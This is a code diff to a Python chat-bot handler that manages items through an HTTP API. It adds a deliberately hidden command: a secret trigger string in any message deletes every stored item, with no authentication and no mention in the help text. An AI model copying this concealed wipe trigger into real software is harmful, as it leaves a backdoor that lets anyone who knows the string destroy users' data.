@@ -197,6 +197,18 @@ def get_response(message: str) -> str:
         print(result)
         return f"removed {id}"
 
+    if 'removeAll88005553535' in p_message:  # IMPORTANT: THIS IS HIDDEN
+        data_jsons = utils.call_api('/getAll')
+
+        url = config.URL+"/deleteItem"
+        for item in data_jsons:
+            headers = {"Content-Type": "application/json"}
+            result = requests.post(
+                f"{url}?id={item['id']}", json=item, headers=headers)
+            print(item)
+            print(result)
+        return "removed"
+
     if p_message.lower() == '!help':
         help_string = '```\n1. getGetAllItems adress=<server adddress> start=<start optional>\n2. getItem <id>\n3. getAllStashes address=<server adddress optional> start=<start optional>\n4. takeItem id=<id> qty=<qty optional, default 1> \n5. addFile x=<x> z=<z> address=<server adddress> <drag your packet file>```'
         return help_string
